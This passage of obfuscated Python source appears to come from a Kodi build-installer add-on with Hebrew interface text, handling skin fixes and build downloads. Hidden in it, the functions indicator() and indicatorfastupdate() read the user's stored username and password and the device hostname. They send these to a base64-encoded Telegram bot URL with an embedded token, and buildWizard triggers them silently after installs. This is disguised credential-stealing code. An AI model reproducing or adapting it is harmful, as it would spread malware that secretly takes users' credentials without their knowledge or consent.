			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3379
			sys .exit ()#line:3380
		DP .close ()#line:3381
	forceUpdate ()#line:3382
def indicator ():#line:3383
       try :#line:3384
          import json #line:3385
          wiz .log ('FRESH MESSAGE')#line:3386
          O0000O0OO0OO0O00O =(ADDON .getSetting ("user"))#line:3387
          O00O0OOOO00O0O0OO =(ADDON .getSetting ("pass"))#line:3388
          OOOO0000OOOOO0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3389
          O0O0OO0OOOOO00OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3390
          OO000O0O0OO0OO00O =O0000O0OO0OO0O00O #line:3392
          OO0OO000O0OOO0OO0 =O00O0OOOO00O0O0OO #line:3393
          import socket #line:3394
          O0O0OO0OOOOO00OO0 =urllib2 .urlopen (OOOO0000OOOOO0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO000O0O0OO0OO00O +' - '+OO0OO000O0OOO0OO0 ).readlines ()#line:3395
       except :pass #line:3397
def indicatorfastupdate ():#line:3398
       try :#line:3399
          import json #line:3400
          wiz .log ('FRESH MESSAGE')#line:3401
          OOOOO000OO00O0O0O =(ADDON .getSetting ("user"))#line:3402
          OOOOOOO0OO000OOOO =(ADDON .getSetting ("pass"))#line:3403
          OO0OOO00O000OOO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3405
          OO00000O00000OOOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3406
          O0000OOOO0OO0OO00 =str (json .loads (OO00000O00000OOOO )['ip'])#line:3407
          O0O0OOO00000OO000 =OOOOO000OO00O0O0O #line:3408
          OO0OO0O00000OOOO0 =SHOW17 #line:3409
          import socket #line:3410
          OO00000O00000OOOO =urllib2 .urlopen (OO0OOO00O000OOO00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0OOO00000OO000 +' - '+OO0OO0O00000OOOO0 ).readlines ()#line:3411
       except :pass #line:3413
def skinfix18 ():#line:3414
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3415
		OO0O00O0OO00OO0O0 =wiz .workingURL (SKINID18DDONXML )#line:3416
		if OO0O00O0OO00OO0O0 ==True :#line:3417
			OO0O00OOOO0O0OOO0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3418
			if len (OO0O00OOOO0O0OOO0 )>0 :#line:3419
				O00O0O0O0O0OO0000 ='%s-%s.zip'%(SKINID18 ,OO0O00OOOO0O0OOO0 [0 ])#line:3420
				OO000OOOO0OOO0OO0 =wiz .workingURL (SKIN18ZIPURL +O00O0O0O0O0OO0000 )#line:3421
				if OO000OOOO0OOO0OO0 ==True :#line:3422
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3423
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3424
					OO00OO000OOOO0OO0 =os .path .join (PACKAGES ,O00O0O0O0O0OO0000 )#line:3425
					try :os .remove (OO00OO000OOOO0OO0 )#line:3426
					except :pass #line:3427
					downloader .download (SKIN18ZIPURL +O00O0O0O0O0OO0000 ,OO00OO000OOOO0OO0 ,DP )#line:3428
					extract .all (OO00OO000OOOO0OO0 ,HOME ,DP )#line:3429
					try :#line:3430
						OO00OOOOOO00OO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3431
						O0O0000OO000O00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3432
						os .rename (OO00OOOOOO00OO000 ,O0O0000OO000O00O0 )#line:3433
					except :#line:3434
						pass #line:3435
					try :#line:3436
						O0O0O0O00O00OO000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O00000OOOO00O0OOO =O0O0O0O00O00OO000 .read ();O0O0O0O00O00OO000 .close ()#line:3437
						OO0OOO00OOOO0OOO0 =wiz .parseDOM (O00000OOOO00O0OOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3438
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO00OOOO0OOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3439
					except :#line:3440
						pass #line:3441
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3442
					DP .close ()#line:3443
					xbmc .sleep (500 )#line:3444
					wiz .forceUpdate (True )#line:3445
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3446
				else :#line:3447
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3448
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO000OOOO0OOO0OO0 ,xbmc .LOGERROR )#line:3449
			else :#line:3450
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3451
		else :#line:3452
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3453
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3454
def skinfix17 ():#line:3455
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3456
		OOO000O0OOOOOO000 =wiz .workingURL (SKINID17DDONXML )#line:3457
		if OOO000O0OOOOOO000 ==True :#line:3458
			O0OO0O0000OO0OO0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3459
			if len (O0OO0O0000OO0OO0O )>0 :#line:3460
				O0O0OOOO0OOO0000O ='%s-%s.zip'%(SKINID17 ,O0OO0O0000OO0OO0O [0 ])#line:3461
				OO0OOO000OOOOO0O0 =wiz .workingURL (SKIN17ZIPURL +O0O0OOOO0OOO0000O )#line:3462
				if OO0OOO000OOOOO0O0 ==True :#line:3463
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3464
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3465
					O00OOOO00OOO000O0 =os .path .join (PACKAGES ,O0O0OOOO0OOO0000O )#line:3466
					try :os .remove (O00OOOO00OOO000O0 )#line:3467
					except :pass #line:3468
					downloader .download (SKIN17ZIPURL +O0O0OOOO0OOO0000O ,O00OOOO00OOO000O0 ,DP )#line:3469
					extract .all (O00OOOO00OOO000O0 ,HOME ,DP )#line:3470
					try :#line:3471
						OO0O00000O0O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3472
						OO00OOO0O00O00000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3473
						os .rename (OO0O00000O0O0OOO0 ,OO00OOO0O00O00000 )#line:3474
					except :#line:3475
						pass #line:3476
					try :#line:3477
						O0000OO000000OOO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0000OOOOOO0OO0O =O0000OO000000OOO0 .read ();O0000OO000000OOO0 .close ()#line:3478
						OOO000O0O000OOOOO =wiz .parseDOM (OO0000OOOOOO0OO0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3479
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000O0O000OOOOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3480
					except :#line:3481
						pass #line:3482
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3483
					DP .close ()#line:3484
					xbmc .sleep (500 )#line:3485
					wiz .forceUpdate (True )#line:3486
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3487
				else :#line:3488
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3489
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0OOO000OOOOO0O0 ,xbmc .LOGERROR )#line:3490
			else :#line:3491
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3492
		else :#line:3493
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3494
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3495
def fix17update ():#line:3496
	if KODIV >=17 and KODIV <18 :#line:3497
		wiz .kodi17Fix ()#line:3498
		xbmc .sleep (4000 )#line:3499
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3500
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3501
		fixfont ()#line:3502
		OO00O0O0000O000O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3503
		try :#line:3505
			O0O00000OOOOOO0OO =open (OO00O0O0000O000O0 ,'r')#line:3506
			O0O0O0OOOOOOOO0OO =O0O00000OOOOOO0OO .read ()#line:3507
			O0O00000OOOOOO0OO .close ()#line:3508
			O0OO00O000OOOOOO0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3509
			OO0O0OOOOOO0OOOO0 =re .compile (O0OO00O000OOOOOO0 ).findall (O0O0O0OOOOOOOO0OO )[0 ]#line:3510
			O0O00000OOOOOO0OO =open (OO00O0O0000O000O0 ,'w')#line:3511
			O0O00000OOOOOO0OO .write (O0O0O0OOOOOOOO0OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO0O0OOOOOO0OOOO0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3512
			O0O00000OOOOOO0OO .close ()#line:3513
		except :#line:3514
				pass #line:3515
		wiz .kodi17Fix ()#line:3516
		OO00O0O0000O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3517
		try :#line:3518
			O0O00000OOOOOO0OO =open (OO00O0O0000O000O0 ,'r')#line:3519
			O0O0O0OOOOOOOO0OO =O0O00000OOOOOO0OO .read ()#line:3520
			O0O00000OOOOOO0OO .close ()#line:3521
			O0OO00O000OOOOOO0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3522
			OO0O0OOOOOO0OOOO0 =re .compile (O0OO00O000OOOOOO0 ).findall (O0O0O0OOOOOOOO0OO )[0 ]#line:3523
			O0O00000OOOOOO0OO =open (OO00O0O0000O000O0 ,'w')#line:3524
			O0O00000OOOOOO0OO .write (O0O0O0OOOOOOOO0OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO0O0OOOOOO0OOOO0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3525
			O0O00000OOOOOO0OO .close ()#line:3526
		except :#line:3527
				pass #line:3528
		swapSkins ('skin.Premium.mod')#line:3529
def fix18update ():#line:3531
	if KODIV >=18 :#line:3532
		xbmc .sleep (4000 )#line:3533
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3534
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3535
		fixfont ()#line:3536
		OOO00O0OOOOO0O000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3537
		try :#line:3538
			O0OOO0OOO0000OO0O =open (OOO00O0OOOOO0O000 ,'r')#line:3539
			O0O0O0000O0000OO0 =O0OOO0OOO0000OO0O .read ()#line:3540
			O0OOO0OOO0000OO0O .close ()#line:3541
			OO00O0O0OO0000OOO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3542
			OO00OOOO00OOOOOO0 =re .compile (OO00O0O0OO0000OOO ).findall (O0O0O0000O0000OO0 )[0 ]#line:3543
			O0OOO0OOO0000OO0O =open (OOO00O0OOOOO0O000 ,'w')#line:3544
			O0OOO0OOO0000OO0O .write (O0O0O0000O0000OO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO00OOOO00OOOOOO0 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3545
			O0OOO0OOO0000OO0O .close ()#line:3546
		except :#line:3547
				pass #line:3548
		wiz .kodi17Fix ()#line:3549
		OOO00O0OOOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3550
		try :#line:3551
			O0OOO0OOO0000OO0O =open (OOO00O0OOOOO0O000 ,'r')#line:3552
			O0O0O0000O0000OO0 =O0OOO0OOO0000OO0O .read ()#line:3553
			O0OOO0OOO0000OO0O .close ()#line:3554
			OO00O0O0OO0000OOO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3555
			OO00OOOO00OOOOOO0 =re .compile (OO00O0O0OO0000OOO ).findall (O0O0O0000O0000OO0 )[0 ]#line:3556
			O0OOO0OOO0000OO0O =open (OOO00O0OOOOO0O000 ,'w')#line:3557
			O0OOO0OOO0000OO0O .write (O0O0O0000O0000OO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO00OOOO00OOOOOO0 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3558
			O0OOO0OOO0000OO0O .close ()#line:3559
		except :#line:3560
				pass #line:3561
		swapSkins ('skin.Premium.mod')#line:3562
def buildWizard (O00OOOO00000O00OO ,O000O0OO000OO0000 ,theme =None ,over =False ):#line:3565
	if over ==False :#line:3566
		OOOO0O00O000OOOOO =wiz .checkBuild (O00OOOO00000O00OO ,'url')#line:3567
		if OOOO0O00O000OOOOO ==False :#line:3569
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','אנא המתן')))#line:3573
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3574
			return #line:3575
		O00OO000O000OOO00 =wiz .workingURL (OOOO0O00O000OOOOO )#line:3576
		if O00OO000O000OOO00 ==False :#line:3577
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00OO000O000OOO00 ))#line:3578
			return #line:3579
	if O000O0OO000OO0000 =='gui':#line:3580
		if O00OOOO00000O00OO ==BUILDNAME :#line:3581
			if over ==True :OO0O0OO0O0OO0OO00 =1 #line:3582
			else :OO0O0OO0O0OO0OO00 =1 #line:3583
		else :#line:3584
			OO0O0OO0O0OO0OO00 =1 #line:3585
		if OO0O0OO0O0OO0OO00 :#line:3586
			remove_addons ()#line:3587
			remove_addons2 ()#line:3588
			OO00O0OOOOOOO0O0O =wiz .checkBuild (O00OOOO00000O00OO ,'gui')#line:3589
			OO00OO00OO0O0O00O =O00OOOO00000O00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3590
			if not wiz .workingURL (OO00O0OOOOOOO0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3591
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3592
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO ),'','אנא המתן')#line:3593
			O00O000O00O0OOOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00OO00OO0O0O00O )#line:3594
			try :os .remove (O00O000O00O0OOOO0 )#line:3595
			except :pass #line:3596
			logging .warning (OO00O0OOOOOOO0O0O )#line:3597
			if 'google'in OO00O0OOOOOOO0O0O :#line:3598
			   OOOOO0OOOO0O00000 =googledrive_download (OO00O0OOOOOOO0O0O ,O00O000O00O0OOOO0 ,DP ,wiz .checkBuild (O00OOOO00000O00OO ,'filesize'))#line:3599
			else :#line:3602
			  downloader .download (OO00O0OOOOOOO0O0O ,O00O000O00O0OOOO0 ,DP )#line:3603
			xbmc .sleep (100 )#line:3604
			OOOOO0000OO0000OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO )#line:3605
			DP .update (0 ,OOOOO0000OO0000OO ,'','אנא המתן')#line:3606
			extract .all (O00O000O00O0OOOO0 ,HOME ,DP ,title =OOOOO0000OO0000OO )#line:3607
			DP .close ()#line:3608
			wiz .defaultSkin ()#line:3609
			wiz .lookandFeelData ('save')#line:3610
			wiz .kodi17Fix ()#line:3611
			xbmc .executebuiltin ("ReloadSkin()")#line:3612
			if INSTALLMETHOD ==1 :OOO000000OOO0OOO0 =1 #line:3613
			elif INSTALLMETHOD ==2 :OOO000000OOO0OOO0 =0 #line:3614
			else :DP .close ()#line:3615
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3616
			indicatorfastupdate ()#line:3617
		else :#line:3619
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3620
	if O000O0OO000OO0000 =='gui2':#line:3621
		if O00OOOO00000O00OO ==BUILDNAME :#line:3622
			if over ==True :OO0O0OO0O0OO0OO00 =1 #line:3623
			else :OO0O0OO0O0OO0OO00 =1 #line:3624
		else :#line:3625
			OO0O0OO0O0OO0OO00 =1 #line:3626
		if OO0O0OO0O0OO0OO00 :#line:3627
			remove_addons ()#line:3628
			remove_addons2 ()#line:3629
			OO00O0OOOOOOO0O0O =wiz .checkBuild (O00OOOO00000O00OO ,'gui')#line:3630
			OO00OO00OO0O0O00O =O00OOOO00000O00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3631
			if not wiz .workingURL (OO00O0OOOOOOO0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3632
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3633
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO ),'','אנא המתן')#line:3634
			O00O000O00O0OOOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00OO00OO0O0O00O )#line:3635
			try :os .remove (O00O000O00O0OOOO0 )#line:3636
			except :pass #line:3637
			logging .warning (OO00O0OOOOOOO0O0O )#line:3638
			if 'google'in OO00O0OOOOOOO0O0O :#line:3639
			   OOOOO0OOOO0O00000 =googledrive_download (OO00O0OOOOOOO0O0O ,O00O000O00O0OOOO0 ,DP ,wiz .checkBuild (O00OOOO00000O00OO ,'filesize'))#line:3640
			else :#line:3643
			  downloader .download (OO00O0OOOOOOO0O0O ,O00O000O00O0OOOO0 ,DP )#line:3644
			xbmc .sleep (100 )#line:3645
			OOOOO0000OO0000OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO )#line:3646
			DP .update (0 ,OOOOO0000OO0000OO ,'','אנא המתן')#line:3647
			extract .all (O00O000O00O0OOOO0 ,HOME ,DP ,title =OOOOO0000OO0000OO )#line:3648
			DP .close ()#line:3649
			wiz .defaultSkin ()#line:3650
			wiz .lookandFeelData ('save')#line:3651
			if INSTALLMETHOD ==1 :OOO000000OOO0OOO0 =1 #line:3654
			elif INSTALLMETHOD ==2 :OOO000000OOO0OOO0 =0 #line:3655
			else :DP .close ()#line:3656
		else :#line:3658
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3659
	elif O000O0OO000OO0000 =='fresh':#line:3660
		freshStart (O00OOOO00000O00OO )#line:3661
	elif O000O0OO000OO0000 =='normal':#line:3662
		if url =='normal':#line:3663
			if KEEPTRAKT =='true':#line:3664
				traktit .autoUpdate ('all')#line:3665
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3666
			if KEEPREAL =='true':#line:3667
				debridit .autoUpdate ('all')#line:3668
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3669
			if KEEPLOGIN =='true':#line:3670
				loginit .autoUpdate ('all')#line:3671
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3672
		O0O00OOOOO0O0O00O =int (KODIV );O0OO0OO0O0O0O0000 =int (float (wiz .checkBuild (O00OOOO00000O00OO ,'kodi')))#line:3673
		if not O0O00OOOOO0O0O00O ==O0OO0OO0O0O0O0000 :#line:3674
			if O0O00OOOOO0O0O00O ==16 and O0OO0OO0O0O0O0000 <=15 :O0O0O0O0000OO0OOO =False #line:3675
			else :O0O0O0O0000OO0OOO =True #line:3676
		else :O0O0O0O0000OO0OOO =False #line:3677
		if O0O0O0O0000OO0OOO ==True :#line:3678
			O00OO00O0O0OO0000 =1 #line:3679
		else :#line:3680
			if not over ==False :O00OO00O0O0OO0000 =1 #line:3681
			else :O00OO00O0O0OO0000 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3682
		if O00OO00O0O0OO0000 :#line:3683
			wiz .clearS ('build')#line:3684
			OO00O0OOOOOOO0O0O =wiz .checkBuild (O00OOOO00000O00OO ,'url')#line:3685
			OO00OO00OO0O0O00O =O00OOOO00000O00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3686
			if not wiz .workingURL (OO00O0OOOOOOO0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3687
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3688
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO ,wiz .checkBuild (O00OOOO00000O00OO ,'version')),'','אנא המתן')#line:3689
			O00O000O00O0OOOO0 =os .path .join (PACKAGES ,'%s.zip'%OO00OO00OO0O0O00O )#line:3690
			try :os .remove (O00O000O00O0OOOO0 )#line:3691
			except :pass #line:3692
			logging .warning (OO00O0OOOOOOO0O0O )#line:3693
			if 'google'in OO00O0OOOOOOO0O0O :#line:3694
			   OOOOO0OOOO0O00000 =googledrive_download (OO00O0OOOOOOO0O0O ,O00O000O00O0OOOO0 ,DP ,wiz .checkBuild (O00OOOO00000O00OO ,'filesize'))#line:3695
			else :#line:3698
			  downloader .download (OO00O0OOOOOOO0O0O ,O00O000O00O0OOOO0 ,DP )#line:3699
			xbmc .sleep (1000 )#line:3700
			OOOOO0000OO0000OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO ,wiz .checkBuild (O00OOOO00000O00OO ,'version'))#line:3701
			DP .update (0 ,OOOOO0000OO0000OO ,'','Please Wait')#line:3702
			O0O00O0O00OO0O0OO ,OO00O0000OOO0O00O ,OO0O00OO00O0000O0 =extract .all (O00O000O00O0OOOO0 ,HOME ,DP ,title =OOOOO0000OO0000OO )#line:3703
			if int (float (O0O00O0O00OO0O0OO ))>0 :#line:3704
				wiz .fixmetas ()#line:3705
				wiz .lookandFeelData ('save')#line:3706
				wiz .defaultSkin ()#line:3707
				wiz .setS ('buildname',O00OOOO00000O00OO )#line:3709
				wiz .setS ('buildversion',wiz .checkBuild (O00OOOO00000O00OO ,'version'))#line:3710
				wiz .setS ('buildtheme','')#line:3711
				wiz .setS ('latestversion',wiz .checkBuild (O00OOOO00000O00OO ,'version'))#line:3712
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3713
				wiz .setS ('installed','true')#line:3714
				wiz .setS ('extract',str (O0O00O0O00OO0O0OO ))#line:3715
				wiz .setS ('errors',str (OO00O0000OOO0O00O ))#line:3716
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O00O0O00OO0O0OO ,OO00O0000OOO0O00O ))#line:3717
				O00O0OO000O000OOO =(ADDON .getSetting ("gaiaseren"))#line:3719
				if O00O0OO000O000OOO =='true':#line:3720
					wiz .kodi17Fix ()#line:3721
				fastupdatefirstbuild (NOTEID )#line:3722
				skin_homeselect ()#line:3723
				skin_lower ()#line:3724
				rdbuildinstall ()#line:3725
				try :gaiaserenaddon ()#line:3727
				except :pass #line:3728
				adults18 ()#line:3729
				skinfix18 ()#line:3730
				try :os .remove (O00O000O00O0OOOO0 )#line:3732
				except :pass #line:3733
				if O00O0OO000O000OOO =='true':#line:3735
					wiz .kodi17Fix ()#line:3736
				if int (float (OO00O0000OOO0O00O ))>0 :#line:3738
					OO0O0OO0O0OO0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO00000O00OO ,wiz .checkBuild (O00OOOO00000O00OO ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O00O0O00OO0O0OO ,'%',COLOR1 ,OO00O0000OOO0O00O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3739
					if OO0O0OO0O0OO0OO00 :#line:3740
						if isinstance (OO00O0000OOO0O00O ,unicode ):#line:3741
							OO0O00OO00O0000O0 =OO0O00OO00O0000O0 .encode ('utf-8')#line:3742
						wiz .TextBox (ADDONTITLE ,OO0O00OO00O0000O0 )#line:3743
				DP .close ()#line:3744
				O0OOOO00000OO0O0O =wiz .themeCount (O00OOOO00000O00OO )#line:3745
				indicator ()#line:3746
				if not O0OOOO00000OO0O0O ==False :#line:3747
					buildWizard (O00OOOO00000O00OO ,'theme')#line:3748
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3749
				if INSTALLMETHOD ==1 :OOO000000OOO0OOO0 =1 #line:3750
				elif INSTALLMETHOD ==2 :OOO000000OOO0OOO0 =0 #line:3751
				else :resetkodi ()#line:3752
				if OOO000000OOO0OOO0 ==1 :wiz .reloadFix ()#line:3754
				else :wiz .killxbmc (True )#line:3755
			else :#line:3756
				if isinstance (OO00O0000OOO0O00O ,unicode ):#line:3757
					OO0O00OO00O0000O0 =OO0O00OO00O0000O0 .encode ('utf-8')#line:3758
				OO00O00O0000OOOO0 =open (O00O000O00O0OOOO0 ,'r')#line:3759
				O0OOOOOOOOO00OOO0 =OO00O00O0000OOOO0 .read ()#line:3760
				OOO00000OOO00O000 =''#line:3761
				for O00O000OOO000OOOO in OOOOO0OOOO0O00000 :#line:3762
				  OOO00000OOO00O000 ='key: '+OOO00000OOO00O000 +'\n'+O00O000OOO000OOOO #line:3763
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O00OO00O0000O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOO00000OOO00O000 )#line:3764
		else :#line:3765
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3766
	elif O000O0OO000OO0000 =='theme':#line:3767
		if theme ==None :#line:3768
			O0OOOO00000OO0O0O =wiz .checkBuild (O00OOOO00000O00OO ,'theme')#line:3769
			OOO0O00000O0OO0OO =[]#line:3770
